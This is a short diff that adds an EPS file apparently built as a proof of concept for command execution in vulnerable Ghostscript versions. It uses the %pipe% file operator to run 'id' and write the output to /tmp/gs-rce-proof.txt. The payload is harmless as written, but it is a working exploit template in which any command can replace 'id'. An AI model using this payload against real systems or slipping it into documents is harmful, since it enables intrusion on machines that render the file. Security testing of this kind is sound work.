@@ -1,0 +1,8 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 100 100
+
+% Method: Direct pipe via file operator
+% In vulnerable GS, (%pipe%cmd) (w) file opens a pipe
+(%pipe%id > /tmp/gs-rce-proof.txt) (w) file closefile
+
+showpage
